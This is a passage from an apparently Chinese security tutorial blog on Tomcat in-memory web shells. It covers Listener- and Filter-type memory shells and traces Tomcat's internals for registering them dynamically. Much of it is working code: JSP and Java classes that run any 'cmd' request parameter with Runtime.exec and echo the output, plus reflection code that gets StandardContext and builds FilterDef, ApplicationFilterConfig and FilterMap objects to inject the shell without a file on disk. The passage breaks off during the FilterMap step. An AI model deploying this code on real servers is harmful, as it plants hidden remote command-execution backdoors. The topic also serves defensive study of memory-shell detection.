class="hljs-keyword">class</span> <span class="hljs-title class_">Listener_memshell</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span>&#123;<br>            <span class="hljs-comment">// 获取request请求</span><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-comment">// 获取参数</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    <span class="hljs-comment">// 获得response响应</span><br>                    <span class="hljs-type">Field</span> <span class="hljs-variable">requestF</span> <span class="hljs-operator">=</span> req.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>                    requestF.setAccessible(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (Request) requestF.get(req);<br>                    <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> (Response) request.getResponse();<br><br>                    <span class="hljs-comment">// 执行命令</span><br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>                    <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(ins);<br>                    response.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>                    response.getWriter().write(<span class="hljs-string">&quot;Listener_memshell 被执行\n&quot;</span>);<br>                    <span class="hljs-type">int</span> len;<br>                    <span class="hljs-keyword">while</span> ((len = bins.read()) != -<span class="hljs-number">1</span>) &#123;<br>                        response.getWriter().write(len);<br>                    &#125;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>                &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span>&#123;<br><br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">// 获得StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>    <span class="hljs-comment">// 添加恶意Listener</span><br>    <span class="hljs-type">Listener_memshell</span> <span class="hljs-variable">listener_memshell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Listener_memshell</span>();<br>    context.addApplicationEventListener(listener_memshell);<br>%&gt;<br></code></pre></td></tr></table></figure>

<h4 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">Java安全学习——内存马</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10358#toc-6">Tomcat 内存马（一）Listener型</a></p>
<h3 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h3><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>​		filter也称之为过滤器，过滤器实际上就是对web资源进行拦截，做一些过滤，权限鉴别等处理后再交给下一个过滤器或Servlet处理，通常都是用来拦截request进行处理的，也可以对返回的response进行拦截处理。其工作原理是，当web.xml注册了一个Filter来对某个Servlet 程序进行拦截处理时该 Filter 可以对Servlet 容器发送给 Servlet 程序的请求和 Servlet 程序回送给 Servlet 容器的响应进行拦截，可以决定是否将请求继续传递给 Servlet 程序，以及对请求和相应信息进行修改。filter型内存马是将命令执行的文件通过<strong>动态注册</strong>成一个恶意的filter，这个filter没有落地文件并可以让客户端发来的请求通过它来做命令执行。</p>
<p><strong>request：</strong>用来封装请求数据的对象，<strong>获取请求数据</strong>。</p>
<ul>
<li>浏览器会发送HTTP请求到JavaWeb服务器；</li>
<li>后台服务器会对HTTP中的数据解析并存入request对象中；</li>
<li>后续对请求的读取等操作，对将针对request对象进行操作</li>
</ul>
<p><strong>response：</strong>用来封装响应数据的对象，<strong>设置响应数据。</strong></p>
<ul>
<li>在HTTP处理结束后，业务处理的结果会存储到response对象中；</li>
<li>后台服务器通过读取response对象，重新拼接为HTTP响应数据，发送给用户。</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/007b92c20fbf42fb8d69fd3e1923bf5d.png" srcset="/img/loading.gif" lazyload alt="image-20221117191830346"></p>
<p>​		接下来，我们介绍一下Filter内存马构建过程。与Listener内存马分析流程类似，我们先构建一个恶意的Filter过滤器，然后分析其加载过程，从而模拟加载Filter加载恶意Fiter内存马。</p>
<h4 id="恶意Filter过滤器"><a href="#恶意Filter过滤器" class="headerlink" title="恶意Filter过滤器"></a>恶意Filter过滤器</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// src/main/java/Filter_memshell.java</span><br><span class="hljs-keyword">package</span> example.demo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> java.io.BufferedInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-meta">@WebFilter(filterName = &quot;Filter_memshell&quot;,</span><br><span class="hljs-meta">    urlPatterns = &quot;/Login&quot;</span><br><span class="hljs-meta">)</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Filter_memshell</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        message = <span class="hljs-string">&quot;调用 Filter_mem&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> response.getWriter();<br>        <span class="hljs-comment">// 执行命令</span><br>        <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>            <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(ins);<br>            response.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>            printWriter.write(<span class="hljs-string">&quot;Filter_memshell 被执行&quot;</span>);<br>            <span class="hljs-type">int</span> len;<br>            <span class="hljs-keyword">while</span> ((len = bins.read()) != -<span class="hljs-number">1</span>) &#123;<br>                printWriter.write(len);<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 放行请求</span><br>        chain.doFilter(request,response);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>访问<code>/Login</code>即刻触发命令执行。</p>
<p><img src="https://img-blog.csdnimg.cn/76f8bb0f3163448eb9a59c7982321c15.png" srcset="/img/loading.gif" lazyload alt="image-20221125220429948"></p>
<h4 id="动态注册Filter流程"><a href="#动态注册Filter流程" class="headerlink" title="动态注册Filter流程"></a>动态注册Filter流程</h4><p>同样的，在<code>Filter_memshell#doFilter</code>下断点，查看调用栈情况。</p>
<p><img src="https://img-blog.csdnimg.cn/ae11b2b2a0ae4e37a43e8a5539a64c32.png" srcset="/img/loading.gif" lazyload alt="image-20221125220528500"></p>
<p>可以看到在<code>ApplicationFilterChain#internalDoFilter</code>方法中，调用了<code>filter.doFilter</code>，filter变量存储着我们的恶意Listener类，继续查看<code>filter</code>如何生成的。</p>
<p><img src="https://img-blog.csdnimg.cn/8a393fab6e7e43e087720fd11261f7bc.png" srcset="/img/loading.gif" lazyload alt="image-20221125220312340"></p>
<p>可以看到<code>filter</code>是由<code>filterConfig.getFilter</code>返回的，而filterConfig是filters数组元素，很明显<code>ApplicationFilterChain#filters</code>数组存储的就是所有<code>FilterConfig</code>的地方。</p>
<p><img src="https://img-blog.csdnimg.cn/cdf1d2dea72c4d6babe4cd2fc43fb099.png" srcset="/img/loading.gif" lazyload alt="image-20221125220737374"></p>
<p><img src="https://img-blog.csdnimg.cn/42f3d54c96f34159bff4bedf699b60a8.png" srcset="/img/loading.gif" lazyload alt="image-20221125220850419"></p>
<p>同时我们也可以发现<code>ApplicationFilterChain#addFilter</code>，熟悉的感觉又来了，Listener也是这样的，我们只需要找一个<code>ApplicationFilterChain</code>对象就行，Tomcat代码风格果然类似。</p>
<p><img src="https://img-blog.csdnimg.cn/aef0047e00d94c569cbae9955dcd228a.png" srcset="/img/loading.gif" lazyload alt="image-20221125221621467"></p>
<p>继续返回上一层，在<code>StandardWrapperValue#invoke</code>中发现了<code>filterChain.doFilter</code>调用，而<code>filterChain</code>对象则是来自于<code>ApplicationFilterFactory.createFilterChain</code>。</p>
<p><img src="https://img-blog.csdnimg.cn/1db457ebdaf540b49f909d11767d5786.png" srcset="/img/loading.gif" lazyload alt="image-20221125221934710"></p>
<p><img src="https://img-blog.csdnimg.cn/09bc3378523d40fba5038cc81223abed.png" srcset="/img/loading.gif" lazyload alt="image-20221125222043708"></p>
<p>跟进<code>ApplicationFilterFactory#createFilterChain</code>方法，发现<code>filterChain</code>首先通过<code>new ApplicationFilterChain()</code>创建一个空的<code>filterChain</code>，之后获取<code>StandardContext#FilterMaps</code>，<code>FilterMaps</code>对象存储的是对象中存储的是各Filter的名称路径等信息，因此，我们需要构造一个恶意的<code>FilterMap</code>对象。最终我们可以看到<code>StandardContext#FilterMaps</code>是由<code>StandardContext#addFilterMapBefore</code>和<code>StandardContext#addFilterMap</code>写入的，但是吧<code>StandardContext#addFilterMapBefore</code>是头插入方式，即插入的Filter排在循序表前部，更容易被遍历到，所以一般都选择<code>StandardContext#addFilterMapBefore</code>进行插入。</p>
<p><img src="https://img-blog.csdnimg.cn/49f8e9b3f2e242af885be00d88060bdd.png" srcset="/img/loading.gif" lazyload alt="image-20221125222339945"></p>
<p>最后遍历<code>filterMaps</code>将符合条件的使用addFilter将<code>filterConfig</code>添加至链上，而filterConfig是存储在context中的，因此我们还要构造ApplicationFilterConfig对象。</p>
<p><img src="https://img-blog.csdnimg.cn/88367f50d282424bae014e6dfb31fe21.png" srcset="/img/loading.gif" lazyload alt="image-20221125222537485"></p>
<p>现在整个流程开始明朗了起来，动态注册Filter流程如下：</p>
<ul>
<li>1.编写恶意Filter过滤器</li>
<li>2.获得StandardContex对象</li>
<li>3.构造ApplicationFilterConfig</li>
<li>4.构造恶意FilterMap</li>
</ul>
<h4 id="构建Filter内存马"><a href="#构建Filter内存马" class="headerlink" title="构建Filter内存马"></a>构建Filter内存马</h4><h5 id="编写恶意Filter过滤器"><a href="#编写恶意Filter过滤器" class="headerlink" title="编写恶意Filter过滤器"></a>编写恶意Filter过滤器</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Filter_memshell</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">private</span> String message;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>            message = <span class="hljs-string">&quot;调用 Filter_mem&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-comment">// 执行命令</span><br>            <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">ins</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>                <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bins</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(ins);<br>                response.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>                printWriter.write(<span class="hljs-string">&quot;Filter_memshell 被执行&quot;</span>);<br>                <span class="hljs-type">int</span> len;<br>                <span class="hljs-keyword">while</span> ((len = bins.read()) != -<span class="hljs-number">1</span>) &#123;<br>                    printWriter.write(len);<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">// 放行请求</span><br>            chain.doFilter(request,response);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>

<h5 id="获得StandardContext对象-1"><a href="#获得StandardContext对象-1" class="headerlink" title="获得StandardContext对象"></a>获得StandardContext对象</h5><p>StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。</p>
<p>获取StandardContext实在是有多种方法（包括Listener内存马获取StandardContext），以后可能会统一整理一下，这里列举一二。</p>
<p><strong>方法一</strong></p>
<p>Tomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs abnf">//获取ApplicationContextFacade类<br>ServletContext servletContext <span class="hljs-operator">=</span> request.getSession().getServletContext()<span class="hljs-comment">;</span><br> <br>//反射获取ApplicationContextFacade类属性context为ApplicationContext类<br>Field appContextField <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>appContextField.setAccessible(true)<span class="hljs-comment">;</span><br>ApplicationContext applicationContext <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext)<span class="hljs-comment">;</span><br> <br>//反射获取ApplicationContext类属性context为StandardContext类<br>Field standardContextField <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>standardContextField.setAccessible(true)<span class="hljs-comment">;</span><br>StandardContext standardContext <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p><strong>方法二</strong></p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Field reqF <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>)<span class="hljs-comment">;</span><br>reqF.setAccessible(true)<span class="hljs-comment">;</span><br>Request req <span class="hljs-operator">=</span> (Request) reqF.get(request)<span class="hljs-comment">;</span><br>StandardContext standardContext <span class="hljs-operator">=</span> (StandardContext) req.getContext()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p><strong>方法三</strong></p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">WebappClassLoaderBase webappClassLoaderBase <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()<span class="hljs-comment">;</span><br>StandardContext standardContext <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>此方法在<strong>Tomcat 8 9</strong>是可用的，但是由于高版本tomcat把<code>getResouces</code>返回值弄成null了，就没法用了，可以使用反射获取Resources，下面的代码懒得测试了，遇到再说。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br><span class="hljs-type">StandardRoot</span> <span class="hljs-variable">resources</span> <span class="hljs-operator">=</span> (StandardRoot) getField(webappClassLoaderBase, <span class="hljs-string">&quot;resources&quot;</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) resources.getContext();<br></code></pre></td></tr></table></figure>

<p><strong>方法四</strong></p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象</span><br><span class="hljs-keyword">while</span> (o == <span class="hljs-literal">null</span>) &#123;<br>	<span class="hljs-title class_">Field</span> f = servletContext.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&quot;context&quot;</span>);<br>	f.<span class="hljs-title function_">setAccessible</span>(<span class="hljs-literal">true</span>);<br>	<span class="hljs-title class_">Object</span> <span class="hljs-built_in">object</span> = f.<span class="hljs-title function_">get</span>(servletContext);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">object</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">ServletContext</span>) &#123;<br>	servletContext = (<span class="hljs-title class_">ServletContext</span>) <span class="hljs-built_in">object</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">object</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">StandardContext</span>) &#123;<br>	o = (<span class="hljs-title class_">StandardContext</span>) <span class="hljs-built_in">object</span>;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h5 id="构造ApplicationFilterConfig"><a href="#构造ApplicationFilterConfig" class="headerlink" title="构造ApplicationFilterConfig"></a>构造ApplicationFilterConfig</h5><p>查看ApplicationFilterConfig的构造函数，发现除了需要context之外，还需要FilterDef对象，emmmm。</p>
<p><img src="https://img-blog.csdnimg.cn/1e62487154c6408aa67a5276a3ce3950.png" srcset="/img/loading.gif" lazyload alt="image-20221125225612401"></p>
<p>再次查看<code>FilterDef</code>对象，可以看到<code>FilterDef</code>对象中<code>filter</code>、<code>filterClass</code>、<code>filterName</code>属性，分别对应web.xml中的filter标签。<code>FilterDef</code>的作用主要为描述Filter名字与Filter 实例的关系。同时后面调用<code>context.FilterMap</code>的时候会校验<code>FilterDef</code>，所以我们需要先设置<code>FilterDef</code>。</p>
<p><img src="https://img-blog.csdnimg.cn/ea5113f181574a348cad14ededf0f8af.png" srcset="/img/loading.gif" lazyload alt="image-20221125225820032"></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">filter</span>&gt;<br>    &lt;<span class="hljs-keyword">filter</span>-<span class="hljs-type">name</span>&gt;&lt;/<span class="hljs-keyword">filter</span>-<span class="hljs-type">name</span>&gt;<br>    &lt;<span class="hljs-keyword">filter</span>-<span class="hljs-keyword">class</span>&gt;&lt;/<span class="hljs-keyword">filter</span>-<span class="hljs-keyword">class</span>&gt;<br>&lt;/<span class="hljs-keyword">filter</span>&gt;<br></code></pre></td></tr></table></figure>

<p>​		此外在<code>StandardContext</code>中发现了<code>addFilterDef</code>方法，获得<code>StandardContext</code>看来确实必不可少。</p>
<p><img src="https://img-blog.csdnimg.cn/739ba98a0a1f46088db63efe5a4a840e.png" srcset="/img/loading.gif" lazyload alt="image-20221126185749878"></p>
<p><strong>创建FilterDef对象</strong></p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// 创建FilterDef对象<br>FilterDef filterDef <span class="hljs-operator">=</span> new FilterDef()<span class="hljs-comment">;</span><br>filterDef.setFilterName(filterName)<span class="hljs-comment">;</span><br>filterDef.setFilter(new Filter_memshell())<span class="hljs-comment">;</span><br>filterDef.setFilterClass(Filter_memshell.class.getName())<span class="hljs-comment">;</span><br>// 添加FilterDef对象<br>standardContext.addFilterDef(filterDef)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p><strong>创建ApplicationFIlterConfig对象</strong></p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-comment">// 创建 ApplicationFilterConfig 对象</span><br><span class="hljs-keyword">Constructor</span> &lt;?&gt; [] <span class="hljs-title function_">constructor</span> = <span class="hljs-title function_">ApplicationFilterConfig</span>.<span class="hljs-title function_">class</span>.<span class="hljs-title function_">getDeclaredConstructors</span><span class="hljs-params">()</span>;<br><span class="hljs-keyword">constructor</span>[0].<span class="hljs-title function_">setAccessible</span><span class="hljs-params">(<span class="hljs-keyword">true</span>)</span>;<br>ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) <span class="hljs-keyword">constructor</span>[0].<span class="hljs-title function_">newInstance</span><span class="hljs-params">(standardContext,filterDef)</span>;<br></code></pre></td></tr></table></figure>

<h5 id="构造恶意FilterMap"><a href="#构造恶意FilterMap" class="headerlink" title="构造恶意FilterMap"></a>构造恶意FilterMap</h5><p><code>filterMaps</code>中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的<code>&lt;filter-mapping&gt;</code>标签。</p>
<p><img src="https://img-blog.csdnimg.cn/f8cef3cc2c984ccf809ebe85039ed995.png" srcset="/img/loading.gif" lazyload alt="image-20221125232327574"></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">filter</span>-<span class="hljs-keyword">mapping</span>&gt;<br>    &lt;<span class="hljs-keyword">filter</span>-<span class="hljs-type">name</span>&gt;&lt;/<span class="hljs-keyword">filter</span>-<span class="hljs-type">name</span>&gt;<br>    &lt;url-pattern&gt;&lt;/url-pattern&gt;<br>&lt;/<span class="hljs-keyword">filter</span>-<span class="hljs-keyword">mapping</span>&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 创建filterMap<br>FilterMap filterMap =new FilterMap();<br>filterMap.setFilterName(filterName);<br>filterMap.addURLPattern(<span class="hljs-string">&quot;/filter&quot;</span>);<br>filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><span class="hljs-regexp">//</span> 调用standardContext<span class="hljs-comment">#addFilterMapBefore添加FilterMap对象</span><br>standardContext.addFilterMapBefore(filterMap);<br><br><span class="hljs-regexp">//</span> <span class="hljs-regexp">//</span> 调用FilterMaps<span class="hljs-comment">#addBefore添加FilterMap对象</span><br><span class="hljs-regexp">//</span> Class ContextFilterMaps = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext$ContextFilterMaps&quot;</span>);<br><span class="hljs-regexp">//</span> Field filterMapsField = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterMaps&quot;</span>);<br><span class="hljs-regexp">//</span> filterMapsField.setAccessible(true);<br><span class="hljs-regexp">//</span> Object contextFilterMaps = filterMapsField.get(standardContext);<br><br><span class="hljs-regexp">//</span> Class cl = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext$ContextFilterMaps&quot;</span>);<br><span class="hljs-regexp">//</span> Method m = cl.getDeclaredMethod(<span class="hljs-string">&quot;addBefore&quot;</span>, FilterMap.class);<br><span class="hljs-regexp">//</span> m.setAccessible(true);<br><span class="hljs-regexp">//</span> m.invoke(contextFilterMaps, filterMap);<br></code></pre></td></tr></table></figure>

